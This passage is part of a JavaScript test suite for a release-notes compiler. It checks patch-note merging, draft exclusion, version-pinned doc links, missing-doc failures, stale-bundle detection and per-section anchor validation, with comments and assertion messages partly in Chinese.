      ['0.15.1', '0.15.1', 'v0.15.1.html'],
    ],
  )
})

test('older targets never merge future or draft patches', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(notesDir, '0.15.1', reviewedNote({ version: '0.15.1', sourceFrom: 'v0.15.0' }))
  writePatch(notesDir, '0.15.3', patchText({ notesVersion: '0.15.1' }))
  writePatch(
    notesDir,
    '0.15.2',
    patchText(
      {
        version: '0.15.2',
        notesVersion: '0.15.1',
        status: 'draft',
        sourceFrom: null,
        sourceTo: null,
      },
      '## 问题修复\n\n- 草稿\n',
    ),
  )

  const older = compileAll({ maxVersion: '0.15.1', notesDir, repoRoot: root })
  const oldRuntime = JSON.parse(older.runtimeJson)
  assert.ok(!oldRuntime[0].body.includes('补丁修复'), '旧目标不混入未来补丁')
  const oldIndex = JSON.parse(older.files.get('notes/index.json'))
  assert.deepEqual(
    oldIndex.versions.map((entry) => entry.version),
    ['0.15.1'],
  )

  const newer = compileAll({ maxVersion: '0.15.3', notesDir, repoRoot: root })
  const newRuntime = JSON.parse(newer.runtimeJson)
  assert.match(newRuntime[0].body, /## v0\.15\.3 补丁修复/)
  assert.ok(!newRuntime[0].body.includes('草稿'), '草稿补丁不进发布产物')
})

test('merged patch doc links pin to the patch version, not the main tag', (t) => {
  const { notesDir, root } = makeTree(t)
  writeFileSync(join(root, `docs/user/zh-CN/${PATCH_DOC_ID}.md`), '# 补丁文档\n', 'utf8')
  writeNote(
    notesDir,
    '0.15.1',
    reviewedNote(
      { version: '0.15.1', sourceFrom: 'v0.15.0' },
      `## 本次重点\n\n见 [界面导览](doc:${DOC_ID})。\n`,
    ),
  )
  writePatch(
    notesDir,
    '0.15.3',
    patchText({ notesVersion: '0.15.1' }, `## 问题修复\n\n见 [补丁文档](doc:${PATCH_DOC_ID})。\n`),
  )

  const compiled = compileAll({ maxVersion: '0.15.3', notesDir, repoRoot: root })
  const page = compiled.files.get('notes/v0.15.1.html')
  assert.ok(
    page.includes(`${LINK_POLICY.publicRepoBase}/blob/v0.15.1/docs/user/zh-CN/${DOC_ID}.md`),
    '主稿段落固定到主稿版本',
  )
  assert.ok(
    page.includes(`${LINK_POLICY.publicRepoBase}/blob/v0.15.3/docs/user/zh-CN/${PATCH_DOC_ID}.md`),
    '补丁段落固定到补丁版本',
  )
  // The in-app runtime body keeps the doc: scheme so the bundled doc opens offline.
  const runtime = JSON.parse(compiled.runtimeJson)
  assert.match(runtime[0].body, new RegExp(`\\[补丁文档\\]\\(doc:${PATCH_DOC_ID}\\)`))
})

test('a target patch that links a missing doc fails closed', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(notesDir, '0.15.1', reviewedNote({ version: '0.15.1', sourceFrom: 'v0.15.0' }))
  writePatch(
    notesDir,
    '0.15.3',
    patchText({ notesVersion: '0.15.1' }, '## 问题修复\n\n见 [缺失](doc:missing/doc)。\n'),
  )
  assert.throws(
    () => compileAll({ maxVersion: '0.15.3', notesDir, repoRoot: root }),
    /docs\/release-notes\/patches\/0\.15\.3\.md:.*目标版本文档 docs\/user\/zh-CN\/missing\/doc\.md 不存在/,
  )
})

test('the GitHub body for a patch carries only that fix and links the main note', () => {
  const notes = [
    parseNote(
      reviewedNote({ version: '0.15.1', sourceFrom: 'v0.15.0' }, '## 本次重点\n\n- 主稿内容\n'),
      { file: '0.15.1.md' },
    ),
  ]
  const patches = [
    parsePatchNote(patchText({ notesVersion: '0.15.1' }, '## 问题修复\n\n- 修好了崩溃\n'), {
      file: 'patches/0.15.3.md',
    }),
  ]
  const body = buildGithubBody({ notes, patches, version: '0.15.3' })
  assert.ok(body.startsWith('# Universe Editor v0.15.3'))
  assert.ok(body.includes(`${LINK_POLICY.publicRepoBase}/releases/tag/v0.15.1`), '关联原稿')
  assert.ok(body.includes('修好了崩溃'))
  assert.ok(!body.includes('主稿内容'), '补丁正文不带主稿内容')
})

test('patch sources reach the manifest and block a stale upload bundle', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(notesDir, '0.15.1', reviewedNote({ version: '0.15.1', sourceFrom: 'v0.15.0' }))
  writePatch(notesDir, '0.15.3', patchText({ notesVersion: '0.15.1' }))
  const compiled = compileAll({ maxVersion: '0.15.3', notesDir, repoRoot: root })
  assert.deepEqual(
    compiled.manifest.source.files.map((entry) => [entry.file, entry.kind, entry.versions]),
    [
      ['0.15.1.md', 'note', ['0.15.1']],
      ['patches/0.15.3.md', 'patch', ['0.15.3']],
    ],
  )

  const snapshotDir = join(root, '.snapshot')
  const bundleDir = join(root, 'bundle')
  writeSnapshot({ snapshotDir, compiled })
  writePatch(notesDir, '0.15.3', patchText({ notesVersion: '0.15.1' }, '## 问题修复\n\n- 改过\n'))
  assert.throws(
    () => materializeBundle({ bundleDir, snapshotDir, notesDir }),
    /源文件在打包后发生变化（patches\/0\.15\.3\.md）/,
  )
})

test('merging is deterministic and emits a patch release GitHub body', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(notesDir, '0.15.1', reviewedNote({ version: '0.15.1', sourceFrom: 'v0.15.0' }))
  writePatch(notesDir, '0.15.3', patchText({ notesVersion: '0.15.1' }))

  const first = compileAll({ maxVersion: '0.15.3', notesDir, repoRoot: root })
  const second = compileAll({ maxVersion: '0.15.3', notesDir, repoRoot: root })
  assert.equal(first.runtimeJson, second.runtimeJson)
  assert.deepEqual([...first.files], [...second.files])

  assert.ok(first.files.has('github-release-0.15.3.md'))
  assert.ok(!first.files.has('github-release-0.15.1.md'))
  assert.match(first.files.get('github-release-0.15.3.md'), /修好了崩溃/)
})

// ------------------------------------------------------------------ bodySections 契约

/** main / 渲染端共用的分段契约夹具；源见 fixtures/mergedRuntimeEntries.json。 */
const MERGED_FIXTURE_PATH = join(
  dirname(fileURLToPath(import.meta.url)),
  '../../../apps/editor/src/shared/releaseNotes/__tests__/fixtures/mergedRuntimeEntries.json',
)

function writeMergedFixtureTree(t) {
  const { root, notesDir } = makeTree(t)
  writeFileSync(join(root, 'docs/user/zh-CN/getting-started/x.md'), '# X\n', 'utf8')
  writeNote(
    notesDir,
    '0.15.0',
    noteText(
      {
        version: '0.15.0',
        date: '2026-10-01',
        title: '普通稿',
        summary: '无补丁，元数据缺省。',
        status: 'reviewed',
        sourceFrom: 'v0.14.9',
        sourceTo: 'a'.repeat(40),
      },
      '## 本次重点\n\n- 普通稿一条\n',
    ),
  )
  writeNote(
    notesDir,
    '0.15.1',
    noteText(
      {
        version: '0.15.1',
        date: '2026-10-02',
        title: '主稿',
        summary: '带补丁归并。',
        status: 'reviewed',
        sourceFrom: 'v0.15.0',
        sourceTo: 'b'.repeat(40),
      },
      '## 本次重点\n\n- 见 [本节](#本次重点)\n- 见 [文档](doc:getting-started/x)\n',
    ),
  )
  writePatch(
    notesDir,
    '0.15.2',
    patchText(
      {
        version: '0.15.2',
        notesVersion: '0.15.1',
        date: '2026-10-03',
        sourceFrom: 'v0.15.1',
        sourceTo: 'c'.repeat(40),
      },
      '## 问题修复\n\n- 修好了 A\n\n```text\n## v9.9.9 补丁修复\n```\n',
    ),
  )
  writePatch(
    notesDir,
    '0.15.3',
    patchText(
      {
        version: '0.15.3',
        notesVersion: '0.15.1',
        date: '2026-10-04',
        sourceFrom: 'v0.15.2',
        sourceTo: 'd'.repeat(40),
      },
      '## 问题修复\n\n- 修好了 B\n- 见 [补丁文档](doc:getting-started/x)\n',
    ),
  )
  return { root, notesDir }
}

test('合并补丁稿输出 bodySections 偏移，字节与共享夹具一致', (t) => {
  const { root, notesDir } = writeMergedFixtureTree(t)
  const compiled = compileAll({ maxVersion: '0.15.3', notesDir, repoRoot: root })
  assert.equal(compiled.runtimeJson, readFileSync(MERGED_FIXTURE_PATH, 'utf8'))

  const runtime = JSON.parse(compiled.runtimeJson)
  const merged = runtime.find((entry) => entry.version === '0.15.1')
  assert.deepEqual(merged.bodySections, [
    { version: '0.15.1', offset: 0 },
    { version: '0.15.2', offset: 58 },
    { version: '0.15.3', offset: 121 },
  ])
  // 每个偏移落在真正的补丁标题首字符上；代码块里的假标题（## v9.9.9）不产生分段。
  for (const section of merged.bodySections.slice(1)) {
    assert.match(
      merged.body.slice(section.offset),
      new RegExp(`^## v${section.version} 补丁修复\\n`),
    )
  }
  assert.equal(merged.body.split('## v9.9.9 补丁修复').length - 1, 1)

  // 无补丁的普通稿不带该字段，历史产物字节不变。
  const plain = runtime.find((entry) => entry.version === '0.15.0')
  assert.equal('bodySections' in plain, false)
})

test('锚点只在各自段落内校验：跨段锚点在编译期即被拒绝', (t) => {
  const { root, notesDir } = makeTree(t)
  // 主稿正文引用 `#问题修复`，而该标题只出现在补丁段——分段渲染（每段一个 MarkdownView）
  // 会把它变成段内死链，所以编译器必须在这里拦下，保证合法锚点永远落在本段内。
  writeNote(
    notesDir,
    '0.15.1',
    reviewedNote(
      { version: '0.15.1', sourceFrom: 'v0.15.0' },
      '## 本次重点\n\n- 见 [补丁标题](#问题修复)\n',
    ),
  )
  writePatch(
    notesDir,
    '0.15.2',
    patchText({ version: '0.15.2', notesVersion: '0.15.1' }, '## 问题修复\n\n- 修好了 A\n'),
  )
  assert.throws(
    () => compileAll({ maxVersion: '0.15.2', notesDir, repoRoot: root }),
    /锚点 #问题修复 在本稿内没有对应标题/,
  )
})
